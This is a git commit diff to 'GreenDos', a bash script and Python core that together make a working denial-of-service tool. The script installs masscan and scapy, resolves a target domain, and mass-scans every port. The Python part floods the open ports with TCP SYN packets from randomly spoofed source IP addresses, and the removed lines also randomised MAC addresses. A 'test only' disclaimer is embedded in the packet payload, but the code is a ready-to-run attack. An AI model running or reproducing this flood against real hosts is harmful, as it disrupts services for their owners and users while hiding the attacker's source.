f924679f3856fe6ef038b38921dbdc9288f8dc37
Norouzzadegan <norouzzadegan@mahsan.net>
2020-10-04 17:42:09 +0330

    update core.py and fix problem and this work only for a port

--- GreenDos.sh
+++ GreenDos.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
 
 function help(){
+
+
 echo "-h|--help show help"
 echo "-p|--port select espisific port if no set scan all port"
 echo "-d|--domain set your domain"
@@ -16,90 +18,113 @@ echo "./dos.sh -d domain.com"
 hash masscan 2> /dev/null
 if [ $? -eq 1 ]
 then
-    sudo apt install masscan
+    sudo apt install -y masscan
 fi
 
 hash scapy 2> /dev/null
 if [ $? -eq 1 ]
 then
-    sudo apt install python-scapy
+    sudo apt install -y python-scapy
 fi
+
+hash ping 2> /dev/null
+if [ $? -eq 1 ]
+then
+    sudo apt install -y net-tools
+fi
+
 
 hash python3 2> /dev/null
 if [ $? -eq 1 ]
 then
-    sudo apt install python3
+    sudo apt install -y python3
 fi
 
 hash python2.7 2> /dev/null
 if [ $? -eq 1 ]
 then
-    sudo apt install python2.7
+    sudo apt install -y python2.7
 fi
 
 
 if [ $# -eq 0 ]
 then 
-help
-exit 1
+   help
+   exit 1
 fi
-FLOOD=100
+
+FLOOD=10
+
 while [ $# -ne 0 ]
 do
    case $1 in
    -h)
+
       help
       exit 1
-    ;;
-      --help)
-	  help
+
+   ;;
+   --help)
+
+	   help
       exit 1
-    ;;
+   ;;
    -d)
+
       DOMAIN=$2
       shift
    ;; 
    --domain)
+
       DOMAIN=$2
       shift
    ;;
-  -p)
+   -p)
+
       PORT=$2
       shift
    ;;
-      --port)
+   --port)
+
       PORT=$2
       shift
    ;;
-  -i)
+   -i)
+
       IP=$2
       shift
    ;;
   --ip)
+
       IP=$2
       shift
    ;;
    -f)
-	  FLOOD=$2
-	  shift
+
+	   FLOOD=$2
+	   shift
    ;;
    --flood)
+
       FLOOD=$2
-	  shift
+	   shift
    ;;
    -r)
+
       RANGE=$2
-	  shift
+	   shift
 	;;
 	--range)
-	  RANGE=$2
-	  shift
+
+	   RANGE=$2
+	   shift
 	;;
    *)
+
       help
       exit 1
- esac	
-shift
+  esac	
+ shift
 done
 
 if [ -z $IP ]
@@ -108,36 +133,27 @@ IP=`ping $DOMAIN -c1| head -1| awk '{print $3}'| tr -d \)| tr -d \(`
 fi
 
 
-
-
-
 if [ -z $PORT ] && [ -z $RANGE ]
 then
-PORT=`sudo masscan -p1-65535 $IP  --wait=10 --rate=10000  `
-echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
+   PORT=`sudo masscan -p1-65535 $IP  --wait=10 --rate=10000  `
+   echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
 elif [ $RANGE -ne 0 ]
 then
-PORT=`sudo masscan -p $RANGE $IP  --wait=10 --rate=10000  `
-echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
+   PORT=`sudo masscan -p $RANGE $IP  --wait=10 --rate=10000  `
+   echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
 else
-echo $PORT > /tmp/OPEN_PORT
+   echo $PORT > /tmp/OPEN_PORT
 fi
-
-echo $IP > /tmp/IP
-cat /tmp/IP | head -1 > /tmp/IP2
 
 if [ $PORT -eq 0 ]
 then
-PORT=`sudo masscan -p1-250 $IP  --wait=1 --rate=10000  `
-echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
+   PORT=`sudo masscan -p1-250 $IP  --wait=1 --rate=10000  `
+   echo $PORT | grep Discovered | sed 's/Discovered/\n/gi'| grep open | awk '{print $3}'| tr -d "/tcp" | tr -d " " > /tmp/OPEN_PORT
 else
-echo $PORT > /tmp/OPEN_PORT
-
+   echo $PORT > /tmp/OPEN_PORT
 fi
 
-echo $PORT
-sudo python core.py $FLOOD
 
-rm -rf /tmp/IP2
+sudo python3 core.py $FLOOD $IP
+
 rm -rf /tmp/OPEN_PORT
-rm -rf /tmp/IP
--- core.py
+++ core.py
@@ -4,47 +4,35 @@ import os
 import sys
 
 loop = int(sys.argv[1])
-loop1 = 0
+loop_add = 0
 IPs=[]
 open_port=[]
 loop2 = 0
 
-while loop1 < loop :
+while loop_add < loop :
     Ip_srcA = random.randrange(0,255)
     Ip_srcB = random.randrange(0,255)
     Ip_srcC = random.randrange(0,255)
     Ip_scrD = random.randrange(0,255)
-    source=str(Ip_srcA)+"."+str(Ip_srcB)+"."+str(Ip_srcC)+"."+str(Ip_scrD)
-    loop1=loop1+1
+    source = str(Ip_srcA)+"."+str(Ip_srcB)+"."+str(Ip_srcC)+"."+str(Ip_scrD)
+    loop_add = loop_add+1
     IPs.append(source)
 
 
 file1 = open("/tmp/OPEN_PORT")
 file2 = open("/tmp/IP2")
-for i in file1:
-    open_port.append(int(i))
-for l in file2:
-    m=str(l)
-m=m.splitlines()
 
+for port in file1:
+    open_port.append(int(port))
 
-while loop2 < loop:
+target = str(sys.argv[2])
+
+number_packet = 0
    
-    for ip in IPs:
-        print(loop2)
-        Port_src = random.randrange(1,65534)
-        sequence = random.randrange(1,300000)
-        rand3=""
-        rand1=""
-        rand2=""
-        for i in range (6):
-         numberList = ["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"]
-         rand1=random.choice(numberList)
-         rand2=random.choice(numberList)
-         rand3=rand3+rand1+rand2
-         if i != 5:
-          rand3=rand3+":"
-        send(Ether(src=rand3)/IP(src=ip,dst=m)/TCP(sport=Port_src,dport=open_port,flags="S",seq=sequence)/"Hello World this Tools is Only for Test your Service on Internet dont use for Dangerous Purpose")
-    print("send packet number",loop2)
-    loop=loop+1
-
+for ip in IPs:
+    Port_src = random.randrange(1,65534)
+    sequence = random.randrange(1,300000)
+    send(IP(src=ip,dst=target)/TCP(sport=Port_src,dport=open_port,flags="S",seq=sequence)/"Hello World this Tools is Only for Test your Service on Internet dont use for Dangerous Purpose")
+    number_packet += 1 
+    print("send packet number",number_packet)
+   
